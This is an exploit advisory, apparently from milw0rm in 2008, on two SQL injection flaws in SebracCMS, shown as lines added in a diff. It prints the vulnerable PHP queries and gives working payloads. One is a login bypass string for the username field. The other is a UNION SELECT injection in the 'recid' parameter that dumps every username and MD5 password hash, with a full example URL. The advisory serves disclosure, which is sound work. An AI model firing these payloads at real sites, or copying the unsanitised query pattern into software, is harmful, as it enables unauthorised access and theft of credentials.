@@ -1,0 +1,68 @@
+# Name: SebracCMS
+# Webiste: http://www.sebrac.netsons.org/cms/
+# Vulnerability type: SQL Injection
+# Author:
+#         shinmai, 2008-06-28
+######################################################################################
+# Description:
+#
+# SebracCMS contains two major SQL injection vulnerabilities:
+# Unsanitazed POST-variables in SQL queries when logging users in. This allows
+# login access without proper credentials.
+# And unsanitized GET-variables in SQL queries when loading articles.
+This allows
+# an attacker to read all usernames and passwordhashes in the database.
+#
+# Vulnerable code in cms/index.php:
+
+$n=$_POST['uname'];
+$p= strtolower($_POST['upass']);
+$cryp_p = md5($p);
+//connect to db
+include('incls/config.php');
+$query="select * from sbc_user where uname='$n' and pw='$cryp_p'";
+
+#
+# POC
+#
+# using
+admin' OR '1'='1
+# as the username will allow login without proper registered credentials
+#
+#
+# The second and far more serious SQL Injection is in cms/form/read.php
+#
+# This vulnerability allows an attacker to reveal all users and their
+md5-password hashes.
+#
+#
+# Vulnerable code in cms/form/read.php:
+
+$rec=($_GET['recid']);
+*SNIP*
+$query="Select * from sbc_articles where idart= '$rec'" or die(mysql_error());
+
+#
+# POC
+#
+# using
+1' UNION ALL SELECT uname, uname, uname, pw, uname FROM sbc_user WHERE '1'='1
+# as the GET-variable 'recid' reveals the first post along with all
+registered users and their passwordhashes.
+# Example:
+http://localhost/sbcms/cms/form/read.php?recid=1' UNION ALL SELECT
+uname, uname, uname, pw, uname FROM sbc_user WHERE '1'='1
+
+#
+# There are some other SQLI-vulnerabilities there, but these two are
+the most severe. I was going to include
+# one more for changing any users password, but I simply didn't have
+the time to start crafting very complex
+# injections. Also, I have a sneaking suspicion there's a
+LFI-vulnerability in the photo-gallery code in the CMS,
+# but if there is one, I'll write up an other advisory on that.
+#
+# As always, Good luck and be safe.
+#
+
+# milw0rm.com [2008-06-28]
